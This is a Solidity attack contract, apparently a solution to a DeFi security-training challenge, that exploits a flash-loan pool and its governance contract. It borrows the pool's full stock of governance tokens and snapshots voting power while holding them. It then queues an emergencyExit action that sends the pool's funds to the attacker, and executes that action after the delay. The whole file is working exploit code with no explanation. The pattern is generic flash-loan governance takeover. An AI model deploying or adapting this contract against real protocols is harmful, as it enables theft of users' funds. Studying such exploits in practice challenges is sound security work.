// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface SelfiePoolInterface{
    function maxFlashLoan(address _token) external view returns (uint256);

    function flashFee(address _token, uint256) external view returns (uint256);

    function flashLoan(
        address _receiver,
        address _token,
        uint256 _amount,
        bytes calldata _data
    ) external returns (bool);

    function emergencyExit(address receiver) external;
}

interface SimpleCovernanceInterface {
    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId);

    function executeAction(uint256 actionId) external payable returns (bytes memory);

    function getActionDelay() external pure returns (uint256);

    function getGovernanceToken() external view returns (address);

    function getAction(uint256 actionId) external;

    function getActionCounter() external view returns (uint256);
}

interface IERC20Snapshot {
    function balanceOf(address user) external view returns(uint256);
    function approve(address spender, uint256 amount) external;
    function snapshot() external;
}

contract AttackContractSelfie {

    address public immutable owner;
    SelfiePoolInterface public immutable selfiePool;
    SimpleCovernanceInterface public immutable governance;
    address public immutable tokenAddress;

    constructor(address selfiePoolAddress, address governanceAddress){
        owner = msg.sender;
        selfiePool = SelfiePoolInterface(selfiePoolAddress);
        governance = SimpleCovernanceInterface(governanceAddress);
        tokenAddress = governance.getGovernanceToken();
    }

    function initiateAttack() public {
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", owner);
        selfiePool.flashLoan(address(this), tokenAddress, selfiePool.maxFlashLoan(tokenAddress), data);
    }

    function finishAttack() public {
        governance.executeAction(1);
    }

    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data) public returns(bytes32){
        IERC20Snapshot(tokenAddress).snapshot();
        governance.queueAction(address(selfiePool), 0, data);
        IERC20Snapshot(tokenAddress).approve(address(selfiePool), IERC20Snapshot(tokenAddress).balanceOf(address(this)));
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}